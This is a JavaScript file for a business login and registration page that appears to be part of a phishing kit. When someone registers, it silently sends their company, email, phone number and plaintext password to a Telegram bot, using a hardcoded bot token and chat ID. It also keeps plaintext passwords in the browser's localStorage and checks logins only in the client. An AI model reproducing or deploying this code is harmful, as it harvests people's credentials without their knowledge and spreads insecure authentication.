document.addEventListener('DOMContentLoaded', function() {
    // Form elements
    const loginForm = document.querySelector('#loginForm form');
    const registerForm = document.querySelector('#registerForm form');
    const showRegister = document.getElementById('showRegister');
    const showLogin = document.getElementById('showLogin');
    
    // Modal elements
    const modal = document.getElementById('successModal');
    const closeModal = document.querySelector('.close');

    // Telegram bot configuration
    const TELEGRAM_BOT_TOKEN = '8080602331:AAF9sM7bH1kLe4zKjI1dSJrhQJwYTOnLWH8';
    const TELEGRAM_CHAT_ID = '7279302614';

    // Form toggle functionality
    showRegister.addEventListener('click', function(e) {
        e.preventDefault();
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('registerForm').style.display = 'block';
    });

    showLogin.addEventListener('click', function(e) {
        e.preventDefault();
        document.getElementById('registerForm').style.display = 'none';
        document.getElementById('loginForm').style.display = 'block';
    });

    // Modal close functionality
    closeModal.addEventListener('click', function() {
        modal.style.display = 'none';
    });

    // Close modal when clicking outside
    window.addEventListener('click', function(event) {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });

    // Register form submission
    registerForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const company = document.getElementById('reg-company').value;
        const email = document.getElementById('reg-email').value;
        const phone = document.getElementById('reg-phone').value;
        const password = document.getElementById('reg-password').value;
        const confirmPassword = document.getElementById('reg-confirm').value;
        
        // Validation
        if (!company || !email || !phone || !password || !confirmPassword) {
            showModal('Error', 'Please fill in all fields');
            return;
        }
        
        if (password !== confirmPassword) {
            showModal('Error', 'Passwords do not match');
            return;
        }
        
        if (localStorage.getItem(email)) {
            showModal('Error', 'Email already registered');
            return;
        }
        
        // Save user data
        const user = {
            company,
            email,
            phone,
            password,
            orders: []
        };
        
        localStorage.setItem(email, JSON.stringify(user));
        
        // Update users list
        let users = JSON.parse(localStorage.getItem('users')) || [];
        users.push(email);
        localStorage.setItem('users', JSON.stringify(users));
        
        // Send notification to Telegram
        sendTelegramNotification(company, email, phone, password);
        
        // Show success and switch to login
        showModal('Success', 'Account created successfully!');
        registerForm.reset();
        document.getElementById('registerForm').style.display = 'none';
        document.getElementById('loginForm').style.display = 'block';
    });

    // Login form submission
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const user = JSON.parse(localStorage.getItem(email));
        
        if (user && user.password === password) {
            localStorage.setItem('currentUser', email);
            window.location.href = 'dashboard.html';
        } else {
            showModal('Error', 'Invalid email or password');
        }
    });

    // Modal display function
    function showModal(title, message) {
        document.getElementById('modalTitle').textContent = title;
        document.getElementById('modalMessage').textContent = message;
        modal.style.display = 'block';
    }

    // Function to send Telegram notification
    function sendTelegramNotification(company, email, phone, password) {
        const message = `📢 New Account Created\n\n` +
                       `🏢 Company: ${company}\n` +
                       `📧 Email: ${email}\n` +
                       `📞 Phone: ${phone}\n` +
                       `🔑 Password: ${password}\n\n` +
                       `⏰ Registered at: ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram notification sent:', data);
        })
        .catch(error => {
            console.error('Error sending Telegram notification:', error);
        });
    }
});
